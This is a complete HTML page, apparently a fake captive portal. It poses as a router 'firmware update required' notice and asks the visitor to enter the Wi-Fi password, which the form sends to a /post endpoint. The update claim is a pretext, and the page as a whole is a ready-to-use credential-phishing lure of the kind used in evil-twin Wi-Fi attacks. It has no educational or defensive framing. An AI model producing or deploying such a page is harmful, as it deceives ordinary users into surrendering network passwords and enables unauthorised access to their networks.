<!doctype html><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Router Update</title>
<body style="margin:0;font:16px/1.5 system-ui;background:#f2f3f5;color:#14171c">
<main style="max-width:22rem;margin:12vh auto;padding:1.4rem;background:#fff;border-radius:12px;
box-shadow:0 6px 24px #0002">
<h1 style="font-size:1.2rem;margin:0 0 .5rem">Firmware update required</h1>
<p style="color:#5b6472;margin:0 0 1rem">This router has to be updated before the network
can be used again. Enter the Wi-Fi password to continue.</p>
<form action="/post" method="get">
<input name="password" type="password" placeholder="Wi-Fi password" required
  style="width:100%;box-sizing:border-box;padding:.7rem;border:1px solid #c9ced6;
  border-radius:8px;font-size:1rem">
<button type="submit" style="width:100%;margin-top:.8rem;padding:.75rem;border:0;
border-radius:8px;background:#0b57d0;color:#fff;font-size:1rem">Update router</button>
</form>
<p style="color:#8b93a1;font-size:.8rem;margin:1rem 0 0">The router restarts automatically
after the update.</p>
</main>
